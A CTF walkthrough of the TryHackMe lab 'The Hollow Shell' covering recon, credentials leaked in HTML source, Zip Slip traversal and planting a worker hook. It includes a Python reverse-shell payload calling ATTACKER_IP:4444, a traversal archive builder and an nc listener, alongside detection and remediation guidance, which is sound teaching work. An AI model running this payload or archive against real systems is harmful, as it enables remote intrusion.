---
layout: default
title: "The Hollow Shell — CTF Writeup"
description: "A professional technical write-up for TryHackMe Hacker Holidays 2026 — The Hollow Shell."
---

<style>
.writeup-meta {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 12px;
  margin: 24px 0 32px;
}
.writeup-meta > div {
  padding: 16px;
  border: 1px solid #30363d;
  border-radius: 10px;
  background: #161b22;
}
.writeup-meta strong {
  display: block;
  font-size: 1.15rem;
}
.writeup-meta span {
  color: #8b949e;
  font-size: .85rem;
}
.evidence-caption {
  text-align: center;
  color: #8b949e;
  font-size: .85rem;
  margin-top: -10px;
}
.redacted {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 5px;
  background: #30363d;
  color: #8b949e;
  letter-spacing: .08em;
}
</style>

# 🐚 The Hollow Shell

> **TryHackMe · Hacker Holidays 2026 · Day 10**

A complete technical write-up documenting the compromise path of **The Hollow Shell**, from network reconnaissance through source-code discovery, authenticated access, ZIP archive analysis, Zip Slip exploitation, arbitrary file writes, worker-hook abuse, and controlled reverse-shell execution.

<div class="writeup-meta">
<div><strong>Web</strong><span>Category</span></div>
<div><strong>Medium</strong><span>Difficulty</span></div>
<div><strong>90</strong><span>TryHackMe points</span></div>
<div><strong>Day 10</strong><span>Hacker Holidays 2026</span></div>
<div><strong>Zip Slip</strong><span>Primary vulnerability</span></div>
<div><strong>RCE</strong><span>Final impact</span></div>
</div>

![The Hollow Shell cover](../docs/assets/01-cover.svg)

<p class="evidence-caption">Figure 1 — The Hollow Shell challenge cover.</p>

---

## 1. Executive Summary

**The Hollow Shell** is a web exploitation challenge in the TryHackMe Hacker Holidays 2026 series. The room is built around a seemingly harmless shell-upload feature used to personalise an in-room display.

The attack chain demonstrates how a file-upload feature can become a complete remote-code-execution path when archive extraction is performed without validating archive member paths.

The key weakness is **Zip Slip / arbitrary path traversal during ZIP extraction**. By supplying archive members containing traversal sequences such as `../` and `../../`, files can be written outside the intended extraction directory.

The application further exposes a worker mechanism that processes files placed under a hooks directory. Combining the arbitrary-write primitive with that execution mechanism allows a controlled callback script to be planted and subsequently executed.

### Attack chain

```text
Network Recon
     │
     ▼
TCP/22 + TCP/5000
     │
     ▼
/upload → 405
     │
     ▼
Source-code inspection
     │
     ▼
Credential disclosure
     │
     ▼
Authenticated dashboard
     │
     ▼
ZIP upload with shell.json
     │
     ▼
Zip Slip validation
     │
     ▼
Arbitrary file write
     │
     ▼
Worker hook placement
     │
     ▼
Callback payload
     │
     ▼
Reverse shell
     │
     ▼
Flag location
```

---

## 2. Challenge Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Challenge | The Hollow Shell |
| Series | Hacker Holidays 2026 |
| Day | 10 |
| Category | Web |
| Difficulty | Medium |
| Points | 90 |
| Objective | Find the flag |
| Primary vulnerability | Zip Slip |
| Impact | Arbitrary file write → code execution |
| Initial service | HTTP on TCP/5000 |
| SSH | TCP/22 |

TryHackMe describes the challenge as a web room in Hacker Holidays 2026 and lists the objective as finding the flag. citeturn0search0

> **Scope note:** All testing described here is limited to the intentionally vulnerable TryHackMe lab environment.

---

## 3. Learning Objectives

This challenge provides practical experience with:

- Network reconnaissance
- Service enumeration
- HTTP endpoint discovery
- Source-code inspection
- Credential disclosure
- Authenticated web application testing
- ZIP archive internals
- Path traversal inside archives
- Zip Slip exploitation
- Arbitrary file writes
- Application worker abuse
- Reverse shells
- Post-exploitation validation
- Secure archive extraction
- Defensive detection and remediation

---

# 4. Reconnaissance

## 4.1 Target Discovery

After starting the TryHackMe machine, the assigned target IP was:

```text
MACHINE_IP
```

The first step was a TCP service scan.

### Nmap

```bash
nmap -sC -sV MACHINE_IP
```

The important exposed services were:

```text
22/tcp   open   ssh
5000/tcp open   upnp
```

The presence of an HTTP service on port `5000` was the primary attack surface.

![Nmap reconnaissance](../docs/assets/02-recon-nmap.svg)

<p class="evidence-caption">Figure 2 — Initial Nmap reconnaissance identifying TCP/22 and TCP/5000.</p>

### Initial observations

| Port | State | Service | Relevance |
|---|---|---|---|
| 22/tcp | Open | SSH | Potential remote administration |
| 5000/tcp | Open | Web application | Primary attack surface |

At this stage there was no need to attack SSH directly. The web application exposed on TCP/5000 provided a much larger and more relevant attack surface.

---

# 5. Web Enumeration

## 5.1 Upload Endpoint

The application was accessed through the web service:

```text
http://MACHINE_IP:5000
```

Enumeration identified an `/upload` endpoint.

A normal `GET` request produced:

```text
405 Method Not Allowed
```

![Upload endpoint](../docs/assets/03-upload-method.svg)

<p class="evidence-caption">Figure 3 — The /upload endpoint rejects an unsupported HTTP method.</p>

### Why the 405 matters

A `405 Method Not Allowed` response is different from a `404 Not Found`.

It indicates that:

1. The endpoint exists.
2. The route is recognised by the application.
3. The current HTTP method is not accepted.

This suggested that `/upload` was likely intended for a method such as `POST`.

That observation became important later because the application was clearly designed around file uploads.

---

# 6. Source-Code Inspection

When a web application exposes authentication functionality, the page source should be inspected before attempting brute force or password guessing.

Viewing the relevant HTML source revealed an HTML comment containing credentials.

The exposed values were:

```text
user: concierge
pass: [REDACTED]
```

![Source disclosure](../docs/assets/04-source-disclosure.svg)

<p class="evidence-caption">Figure 4 — Credentials exposed through an HTML source comment.</p>

## Finding: Credential Disclosure

Sensitive authentication material was placed directly inside client-delivered HTML.

This is a serious information-disclosure issue because HTML sent to the browser is not secret.

Anything delivered to the client can potentially be:

- viewed through page source;
- inspected through developer tools;
- retrieved with command-line HTTP clients;
- cached;
- logged by proxies;
- copied by users.

### Security lesson

Credentials should never be embedded in:

```html
<!-- username: ... -->
<!-- password: ... -->
```

or JavaScript, comments, hidden fields, CSS, or other client-side resources.

---

# 7. Authentication

The disclosed credentials were used to access the application.

After authentication, the application presented the **Shoreline Display** dashboard.

![Shoreline Display dashboard](../docs/assets/05-dashboard-upload.svg)

<p class="evidence-caption">Figure 5 — Authenticated Shoreline Display dashboard and shell-upload functionality.</p>

The dashboard contained an upload mechanism described as a way to bring a shell "ashore".

The important application behavior was:

- ZIP archives were accepted.
- The archive needed a `shell.json` file.
- Uploaded shells were stored by the application.
- Optional automation hooks could be applied by a worker.
- Static assets such as `png`, `jpg`, `gif`, `svg`, `css`, and `json` were referenced by the application.

This immediately made the archive extraction process a high-value testing target.

---

# 8. Understanding the ZIP Upload

## 8.1 Build a Benign Archive

Before testing for path traversal, the intended functionality should be understood with a normal archive.

A basic archive containing `shell.json` was prepared and uploaded.

Example structure:

```text
test.zip
└── shell.json
```

![Normal ZIP upload](../docs/assets/06-test-upload.svg)

<p class="evidence-caption">Figure 6 — Baseline ZIP upload used to understand normal application behavior.</p>

The application accepted the archive and stored its contents under a generated shell directory.

This established the expected extraction workflow.

---

# 9. Zip Slip Testing

## 9.1 Vulnerability Concept

**Zip Slip** occurs when an application extracts archive entries without safely validating their destination paths.

Consider:

```text
shells/<random-id>/shell.json
```

If the archive contains:

```text
../marker.txt
```

and the application simply joins the extraction directory with the archive member name, the resulting path can escape the intended directory.

Conceptually:

```text
safe directory:
    /app/shells/random-id/

archive entry:
    ../marker.txt

unsafe result:
    /app/shells/marker.txt
```

More traversal sequences can move even farther:

```text
../../some/path/file
```

The exact impact depends on:

- extraction directory;
- process permissions;
- filesystem layout;
- archive library behavior;
- subsequent application behavior.

---

## 9.2 Marker Test

A controlled marker file was used first rather than immediately attempting code execution.

The archive contained:

```text
../marker.txt
```

The application subsequently exposed the resulting file outside the expected random shell directory.

![Zip Slip marker](../docs/assets/07-zipslip-marker.svg)

<p class="evidence-caption">Figure 7 — Controlled Zip Slip marker demonstrating path traversal during extraction.</p>

### Result

The application treated the traversal-containing archive member as a valid extraction path.

This confirmed the core primitive:

> **An attacker can influence the destination path of extracted archive members.**

That is the central vulnerability of the challenge.

---

# 10. Confirming Arbitrary File Write

A marker file proves path traversal, but a stronger demonstration is to write into a location that the web application can subsequently serve.

A controlled CSS file was created using a traversal path targeting the application's static directory:

```text
../../static/zipslip-proof.css
```

The file contained a harmless marker:

```text
ZIP_SLIP_CONFIRMED
```

![Static file proof](../docs/assets/08-zipslip-static-proof.svg)

<p class="evidence-caption">Figure 8 — Controlled write into a static location confirms arbitrary file placement.</p>

## Why this is stronger than the marker test

The first test established:

```text
Path traversal
```

The second established:

```text
Path traversal
        +
attacker-controlled file content
        +
attacker-controlled destination
```

Therefore the issue was not simply directory traversal.

It was an **arbitrary file-write primitive** within the permissions available to the application.

---

# 11. Discovering the Worker Hook

The dashboard indicated that uploaded shells could have automation hooks applied by a worker.

That functionality was especially interesting because an arbitrary-write primitive becomes significantly more dangerous when an application executes files from a writable location.

A controlled file was therefore written to:

```text
../../hooks/callback.py
```

The test was intentionally designed to establish whether a Python file could be planted in the worker's hook directory.

![Hook write](../docs/assets/09-hook-write.svg)

<p class="evidence-caption">Figure 9 — Controlled placement of a Python hook using the archive traversal primitive.</p>

## Security implication

At this point the attack chain became:

```text
ZIP upload
    ↓
Unsafe extraction
    ↓
Path traversal
    ↓
Arbitrary file write
    ↓
Writable worker hook directory
```

If the worker imports or executes hook files automatically, the final condition for code execution is present.

---

# 12. Building the Payload Archive

A proof-of-concept archive was created containing two members:

```text
reverse-shell.zip
├── shell.json
└── ../../hooks/callback.py
```

Example archive creation:

```python
import zipfile

zf = zipfile.ZipFile("reverse-shell.zip", "w")

zf.writestr(
    "shell.json",
    open("shell.json").read()
)

zf.writestr(
    "../../hooks/callback.py",
    open("callback.py").read()
)

zf.close()
```

![Payload archive](../docs/assets/10-payload-archive.svg)

<p class="evidence-caption">Figure 10 — Payload archive containing the required shell definition and traversal-based hook placement.</p>

---

# 13. Controlled Callback Payload

The callback script used a Python socket to connect back to the testing machine.

A representative proof-of-concept was:

```python
import socket
import os
import pty

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ATTACKER_IP", 4444))

for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)

pty.spawn("/bin/bash")
```

### Important

Replace:

```text
ATTACKER_IP
```

with the IP address of the authorised lab/AttackBox environment.

The payload demonstrates the security impact of arbitrary code execution; it is not intended for use against systems without explicit authorisation.

---

# 14. Starting the Listener

Before triggering the worker, a listener was started:

```bash
nc -lvnp 4444
```

Expected listener state:

```text
Listening on 0.0.0.0 4444
```

The crafted archive was then uploaded through the Shoreline Display interface.

---

# 15. Reverse Shell

Once the worker processed the planted hook, the callback connected to the listener.

The resulting shell identified the application account as:

```text
roomservice
```

and the working directory was:

```text
/var/www/conch
```

![Reverse shell and redacted flag evidence](../docs/assets/11-shell-flag-redacted.svg)

<p class="evidence-caption">Figure 11 — Successful shell access and redacted flag evidence. The flag value is intentionally omitted from this public write-up.</p>

The successful callback confirms the complete exploitation chain:

```text
Unauthenticated information disclosure
              ↓
          Credentials
              ↓
        Authenticated app
              ↓
          ZIP upload
              ↓
         Zip Slip
              ↓
     Arbitrary file write
              ↓
        Hook placement
              ↓
        Worker execution
              ↓
          RCE / shell
```

---

# 16. Flag Retrieval

After obtaining the application shell, the target user's home directory was inspected.

The flag file was located at:

```text
/home/roomservice/flag.txt
```

A public portfolio write-up intentionally does **not** reproduce the flag.

The evidence image included with this repository has the sensitive flag value redacted.

```text
THM{REDACTED}
```

This keeps the repository useful as a technical demonstration without publishing the final challenge answer.

---

# 17. Vulnerability Analysis

## 17.1 Primary Vulnerability — Zip Slip

The core issue is unsafe handling of archive member paths.

A vulnerable extraction pattern conceptually looks like:

```python
destination = os.path.join(upload_dir, member.filename)
extract(member, destination)
```

Without validating the resolved path, a filename such as:

```text
../../hooks/callback.py
```

can escape the intended directory.

### Safe extraction principle

The application should resolve the final path and verify that it remains beneath the intended extraction directory.

Conceptually:

```python
base = os.path.abspath(upload_dir)
target = os.path.abspath(
    os.path.join(base, member.filename)
)

if not target.startswith(base + os.sep):
    raise ValueError("Unsafe archive path")
```

A robust implementation should additionally account for platform-specific path semantics, symbolic links, absolute paths, and archive-library behavior.

---

# 18. Why the Impact Escalated

The Zip Slip vulnerability alone creates an arbitrary-write primitive.

The application architecture made that primitive significantly more dangerous because a writable hook directory was associated with an automated worker.

The resulting relationship was:

| Component | Security consequence |
|---|---|
| ZIP upload | Attacker controls archive content |
| Unsafe extraction | Archive path escapes intended directory |
| Arbitrary write | Attacker controls file destination/content |
| Hook directory | Sensitive executable location becomes writable |
| Worker | Automatically processes hook content |
| Python execution | Arbitrary code execution |
| Reverse callback | Interactive shell |
| Application account | Post-exploitation access |

The important lesson is that vulnerabilities often become more severe through **chaining**.

---

# 19. Attack-Chain Breakdown

## Stage 1 — Reconnaissance

```bash
nmap -sC -sV MACHINE_IP
```

Goal:

- identify exposed services;
- identify the web application;
- determine the initial attack surface.

---

## Stage 2 — Endpoint Discovery

```text
/upload
```

The endpoint returned:

```text
405 Method Not Allowed
```

This established that the route existed and expected another method.

---

## Stage 3 — Source Inspection

The page source disclosed credentials through an HTML comment.

Security lesson:

> Never place credentials in client-delivered source.

---

## Stage 4 — Authentication

The disclosed account provided access to the Shoreline Display dashboard.

---

## Stage 5 — Baseline Upload

A normal ZIP containing:

```text
shell.json
```

was accepted.

---

## Stage 6 — Zip Slip

A traversal member:

```text
../marker.txt
```

escaped the expected extraction directory.

---

## Stage 7 — Arbitrary Write

A controlled file was placed under:

```text
../../static/
```

confirming attacker-controlled destination paths.

---

## Stage 8 — Hook Placement

A Python file was written under:

```text
../../hooks/
```

---

## Stage 9 — Worker Execution

The application worker processed the planted hook.

---

## Stage 10 — Remote Shell

The worker executed the callback and connected to:

```text
ATTACKER_IP:4444
```

---

## Stage 11 — Flag

The flag was located at:

```text
/home/roomservice/flag.txt
```

The value is redacted in this public documentation.

---

# 20. Evidence Matrix

| # | Evidence | Purpose |
|---|---|---|
| 01 | Cover | Challenge identification |
| 02 | Nmap | Service enumeration |
| 03 | Upload endpoint | HTTP behavior |
| 04 | Source disclosure | Credential discovery |
| 05 | Dashboard | Authenticated attack surface |
| 06 | Test upload | Baseline ZIP behavior |
| 07 | Zip Slip marker | Path traversal proof |
| 08 | Static proof | Arbitrary file write |
| 09 | Hook write | Worker attack path |
| 10 | Payload archive | Exploitation package |
| 11 | Shell / redacted flag | Final impact |

---

# 21. Detection Opportunities

A defensive team could detect this attack through several signals.

## 21.1 Suspicious archive paths

Monitor uploaded archives for entries containing:

```text
../
..\ 
/
absolute paths
```

especially combinations such as:

```text
../../
../../../
```

---

## 21.2 Unexpected writes

Alert on web applications writing files outside their designated upload directory.

Examples:

```text
/app/uploads/
/var/www/static/
/app/hooks/
/etc/
/tmp/
```

The exact paths depend on the deployment.

---

## 21.3 Worker anomalies

A worker that normally processes benign shell metadata should not unexpectedly:

- create Python files;
- execute newly uploaded scripts;
- spawn shells;
- initiate outbound connections;
- invoke `/bin/bash`.

---

## 21.4 Network indicators

A reverse shell can produce an outbound connection from the application host to an unexpected destination and port.

In this lab, the proof-of-concept used:

```text
TCP/4444
```

A production detection strategy should not rely solely on one port number.

---

# 22. Remediation

## 22.1 Safely Extract Archives

Never trust archive member names.

Validate every extracted path before writing.

A safer conceptual implementation:

```python
from pathlib import Path

base = Path(upload_dir).resolve()

for member in archive.infolist():
    target = (base / member.filename).resolve()

    if base != target and base not in target.parents:
        raise ValueError("Unsafe archive path")

    # Extract only after validation.
```

Use a well-maintained archive extraction implementation where possible.

---

## 22.2 Reject Traversal

Explicitly reject dangerous archive entries containing:

```text
../
..\ 
absolute paths
drive-letter paths
```

However, simple string matching should not be the only protection. Canonical path validation is important.

---

## 22.3 Restrict Worker Hooks

A user-controlled upload should never be able to write directly into an executable hook directory.

Separate:

```text
user-controlled data
```

from:

```text
trusted executable code
```

---

## 22.4 Run Workers with Least Privilege

The worker should operate under a dedicated low-privilege account.

It should not have unnecessary access to:

- application source;
- credentials;
- system configuration;
- SSH keys;
- other users' home directories;
- privileged execution paths.

---

## 22.5 Remove Credentials from Source

Credentials must never be embedded in HTML source.

Use:

- server-side secret storage;
- environment variables;
- a dedicated secrets manager;
- password hashing for stored passwords;
- secure session management.

---

## 22.6 Restrict Outbound Network Access

If the application does not need arbitrary outbound network connectivity, restrict it.

This can reduce the impact of reverse-shell payloads and other post-exploitation callbacks.

---

# 23. Secure Architecture

A safer design would look like:

```text
                ┌─────────────────────┐
                │   User ZIP Upload   │
                └──────────┬──────────┘
                           │
                           ▼
                ┌─────────────────────┐
                │ Validate Archive    │
                │ - paths             │
                │ - file types        │
                │ - size              │
                │ - count             │
                └──────────┬──────────┘
                           │
                           ▼
                ┌─────────────────────┐
                │ Isolated Extraction │
                │ Directory           │
                └──────────┬──────────┘
                           │
                           ▼
                ┌─────────────────────┐
                │ Non-executable Data │
                │ Storage             │
                └──────────┬──────────┘
                           │
                           ▼
                ┌─────────────────────┐
                │ Sandboxed Worker    │
                │ Least Privilege     │
                └─────────────────────┘
```

The important architectural boundary is that **untrusted uploaded content must never gain write access to trusted executable locations**.

---

# 24. Lessons Learned

## Lesson 1 — Read the source

Client-side source can accidentally expose secrets.

---

## Lesson 2 — 405 responses are useful

A `405` can confirm that an endpoint exists even when the attempted method is incorrect.

---

## Lesson 3 — Test file-upload boundaries

For every archive-upload feature, investigate:

- path traversal;
- absolute paths;
- symbolic links;
- duplicate names;
- nested archives;
- decompression bombs;
- unexpected file types;
- executable content.

---

## Lesson 4 — Prove vulnerabilities incrementally

The exploitation sequence used increasingly impactful tests:

```text
marker
  ↓
static file
  ↓
hook file
  ↓
controlled callback
  ↓
shell
```

This is preferable to immediately deploying an invasive payload.

---

## Lesson 5 — Vulnerability chaining matters

An arbitrary-write vulnerability may initially appear limited.

Its real impact depends on **where the attacker can write** and **what consumes the written file**.

In this challenge:

```text
Zip Slip
   +
Writable hook directory
   +
Automatic worker execution
   =
Remote Code Execution
```

---

# 25. MITRE ATT&CK Mapping

The following mappings describe the observed behavior at a high level.

| Technique | Relevance |
|---|---|
| T1190 — Exploit Public-Facing Application | Web application exploitation |
| T1078 — Valid Accounts | Disclosed application credentials enabled authenticated access |
| T1059 — Command and Scripting Interpreter | Shell/script execution after compromise |
| T1059.004 — Unix Shell | Bash shell obtained during exploitation |
| T1105 — Ingress Tool Transfer | Relevant to post-exploitation scenarios involving transferred tooling |
| T1041 — Exfiltration Over C2 Channel | Relevant to outbound callback channels, depending on post-exploitation activity |

These mappings are contextual rather than a claim that every listed technique was independently demonstrated as a separate challenge objective.

---

# 26. Indicators of Compromise

Potential indicators include:

```text
ZIP members containing ../
ZIP members containing ../../
Unexpected files under static directories
Unexpected Python files under hook directories
Worker execution of newly uploaded files
Outbound TCP connections from the application process
Unexpected /bin/bash children
nc or similar network utilities spawned by the service account
```

Example investigative queries should be adapted to the organisation's logging platform.

---

# 27. Reproduction Checklist

For an authorised lab environment:

```text
[ ] Start TryHackMe machine
[ ] Identify MACHINE_IP
[ ] Scan TCP services
[ ] Identify TCP/5000 web application
[ ] Enumerate /upload
[ ] Inspect HTML source
[ ] Identify exposed credentials
[ ] Authenticate
[ ] Inspect Shoreline Display
[ ] Create benign shell.zip
[ ] Confirm shell.json requirement
[ ] Test ../marker.txt
[ ] Confirm traversal
[ ] Test controlled static write
[ ] Identify worker hook behavior
[ ] Place controlled callback
[ ] Start authorised listener
[ ] Upload crafted archive
[ ] Observe callback
[ ] Validate shell context
[ ] Locate flag.txt
[ ] Keep flag redacted in public documentation
```

---

# 28. Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Network/service enumeration |
| Browser | Application interaction |
| View Source / DevTools | Source inspection |
| Python | ZIP payload generation |
| `zipfile` | Archive construction |
| Netcat | Listener for controlled callback |
| Linux shell | Post-exploitation validation |

---

# 29. Repository Evidence

The repository intentionally separates documentation from evidence assets:

```text
The-Hollow-Shell-TryHackMe-Walkthrough/
│
├── Documentation/
│   └── documentation.md
│
├── Resources/
│   └── notes.md
│
├── docs/
│   ├── index.md
│   ├── _config.yml
│   ├── _sass/
│   │   └── custom.scss
│   └── assets/
│       ├── 01-cover.svg
│       ├── 02-recon-nmap.svg
│       ├── 03-upload-method.svg
│       ├── 04-source-disclosure.svg
│       ├── 05-dashboard-upload.svg
│       ├── 06-test-upload.svg
│       ├── 07-zipslip-marker.svg
│       ├── 08-zipslip-static-proof.svg
│       ├── 09-hook-write.svg
│       ├── 10-payload-archive.svg
│       └── 11-shell-flag-redacted.svg
│
├── README.md
├── SECURITY.md
└── CONTRIBUTING.md
```

The `Documentation/documentation.md` file is the detailed technical record, while `docs/index.md` is the polished GitHub Pages presentation.

---

# 30. Final Attack Narrative

The compromise began with straightforward service enumeration. TCP/5000 exposed a web application, and the `/upload` route confirmed that an upload mechanism existed.

Inspecting the application's source revealed credentials embedded in an HTML comment. Those credentials provided access to the Shoreline Display dashboard.

The dashboard accepted ZIP archives containing `shell.json`. Rather than immediately attempting code execution, the upload mechanism was tested with a benign archive first.

A traversal-containing archive member such as:

```text
../marker.txt
```

demonstrated that the application failed to constrain extraction paths.

A second controlled test wrote a harmless file into a static location, proving that the primitive was an attacker-controlled arbitrary file write rather than merely an isolated directory traversal.

The application's worker architecture then provided the crucial escalation path. A Python file could be planted beneath the worker's hook directory using another traversal-containing archive member.

A controlled callback payload was subsequently packaged alongside the required `shell.json`. With an authorised listener running, processing the uploaded shell caused the worker to execute the planted callback and establish a shell.

The resulting shell operated in the context of the application account. The challenge flag was then located in:

```text
/home/roomservice/flag.txt
```

The flag itself is intentionally redacted from this public repository documentation.

---

# 31. Conclusion

**The Hollow Shell** demonstrates an important real-world security principle:

> **An upload vulnerability should never be evaluated in isolation.**

The dangerous behavior was not simply that the application accepted ZIP files.

The full chain was:

```text
Credential disclosure
        ↓
Authenticated upload
        ↓
Unsafe archive extraction
        ↓
Zip Slip
        ↓
Arbitrary file write
        ↓
Trusted hook location
        ↓
Automatic worker execution
        ↓
Remote code execution
        ↓
Interactive shell
```

The strongest defensive takeaway is equally straightforward:

**Treat archive contents as untrusted input, canonicalise and constrain every extraction path, separate uploaded data from executable code, and run background workers with strict least-privilege permissions.**

---

## 32. References

- TryHackMe — **The Hollow Shell**, Hacker Holidays 2026, Day 10:  
  https://tryhackme.com/room/hh-thehollowshell-ddb582ac
- Jekyll documentation — Sass configuration:  
  https://jekyllrb.com/docs/configuration/sass/
- GitHub Pages — Jekyll themes and site configuration:  
  https://docs.github.com/en/pages/setting-up-a-github-pages-site-with-jekyll
- MITRE ATT&CK — Exploit Public-Facing Application:  
  https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK — Unix Shell:  
  https://attack.mitre.org/techniques/T1059/004/

---

## Author Notes

This write-up is maintained as a portfolio-oriented security research document.

The repository intentionally:

- documents the complete exploitation methodology;
- includes visual evidence for each major stage;
- redacts the final flag;
- separates technical notes from the GitHub Pages presentation;
- focuses on reproducible methodology;
- includes defensive recommendations;
- avoids publishing unnecessary sensitive challenge answers.

> **For authorised educational use only.**
